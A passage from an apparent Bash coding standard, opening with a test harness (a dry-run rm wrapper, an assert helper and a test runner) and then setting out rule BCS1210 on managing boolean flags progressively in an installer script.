  DATA_DIR=./test_data
  # Disable destructive operations
  RM_CMD() { echo "TEST: Would remove $*"; }
else
  DATA_DIR=/var/lib/app
  RM_CMD() { rm "$@"; }
fi

# Assert function for tests
assert() {
  local -- expected=$1
  local -- actual=$2
  local -- message=${3:-Assertion failed}

  if [[ "$expected" != "$actual" ]]; then
    >&2 echo "ASSERT FAIL: $message"
    >&2 echo "  Expected: '$expected'"
    >&2 echo "  Actual:   '$actual'"
    return 1
  fi
  return 0
}

# Test runner pattern
run_tests() {
  local -i passed=0 failed=0
  local -- test_func

  # Find all functions starting with test_
  for test_func in $(declare -F | awk '$3 ~ /^test_/ {print $3}'); do
    if "$test_func"; then
      passed+=1
      echo "✓ $test_func"
    else
      failed+=1
      echo "✗ $test_func"
    fi
  done

  echo "Tests: $passed passed, $failed failed"
  ((failed == 0))
}
```


---


**Rule: BCS1210**

## Progressive State Management

Manage script state by modifying boolean flags based on runtime conditions, separating decision logic from execution.

```bash
# Initial flag declarations
declare -i INSTALL_BUILTIN=0
declare -i BUILTIN_REQUESTED=0
declare -i SKIP_BUILTIN=0

# Parse command-line arguments
main() {
  while (($#)); do
    case $1 in
      --builtin)    INSTALL_BUILTIN=1
                    BUILTIN_REQUESTED=1
                    ;;
      --no-builtin) SKIP_BUILTIN=1
                    ;;
    esac
    shift
  done

  # Progressive state management: adjust flags based on runtime conditions

  # If user explicitly requested to skip, disable installation
  if ((SKIP_BUILTIN)); then
    INSTALL_BUILTIN=0
  fi

  # Check if prerequisites are met, adjust flags accordingly
  if ! check_builtin_support; then
    # If user explicitly requested builtins, try to install dependencies
    if ((BUILTIN_REQUESTED)); then
      warn 'bash-builtins package not found, attempting to install...'
      install_bash_builtins || {
        error 'Failed to install bash-builtins package'
        INSTALL_BUILTIN=0  # Disable builtin installation
      }
    else
      # User didn't explicitly request, just skip
      info 'bash-builtins not found, skipping builtin installation'
      INSTALL_BUILTIN=0
    fi
  fi

  # Build phase: disable on failure
  if ((INSTALL_BUILTIN)); then
    if ! build_builtin; then
      error 'Builtin build failed, disabling builtin installation'
      INSTALL_BUILTIN=0
    fi
  fi

  # Execution phase: actions based on final flag state
  install_standalone
  ((INSTALL_BUILTIN)) && install_builtin ||: # Only runs if still enabled

  show_completion_message
}
```

**Pattern structure:**
1. Declare all boolean flags at the top with initial values
2. Parse command-line arguments, setting flags based on user input
3. Progressively adjust flags based on runtime conditions:
   - Dependency checks (disable if prerequisites missing)
   - Build/operation failures (disable dependent features)
   - User preferences override system defaults
4. Execute actions based on final flag state

**Real-world example - conditional builtin installation:**
```bash
# Initial state (defaults)
declare -i INSTALL_BUILTIN=0
declare -i BUILTIN_REQUESTED=0
declare -i SKIP_BUILTIN=0

# State progression through script lifecycle:

# 1. User input (--builtin flag)
INSTALL_BUILTIN=1
BUILTIN_REQUESTED=1

# 2. Override check (--no-builtin takes precedence)
((SKIP_BUILTIN)) && INSTALL_BUILTIN=0 ||:

# 3. Dependency check (no bash-builtins package)
if ! check_builtin_support; then
  if ((BUILTIN_REQUESTED)); then
    # Try to install, disable on failure
    install_bash_builtins || INSTALL_BUILTIN=0
  else
    # User didn't ask, just disable
    INSTALL_BUILTIN=0
  fi
fi

# 4. Build check (compilation failed)
((INSTALL_BUILTIN)) && ! build_builtin && INSTALL_BUILTIN=0

# 5. Final execution (only runs if INSTALL_BUILTIN=1)
((INSTALL_BUILTIN)) && install_builtin
```

**Benefits:**
- Clean separation between decision logic and action
- Easy to trace how flags change throughout execution
- Fail-safe behavior (disable features when prerequisites fail)
- User intent preserved (`BUILTIN_REQUESTED` tracks original request)
- Idempotent (same input → same state → same output)

**Guidelines:**
- Group related flags together (e.g., `INSTALL_*`, `SKIP_*`)
- Use separate flags for user intent vs. runtime state
- Document state transitions with comments
- Apply state changes in logical order (parse → validate → execute)
- Never modify flags during execution phase (only in setup/validation)

**Rationale:** This pattern allows scripts to adapt to runtime conditions while maintaining clarity about why decisions were made. It's especially useful for installation scripts where features may need to be disabled based on system capabilities or build failures.
#fin
#fin
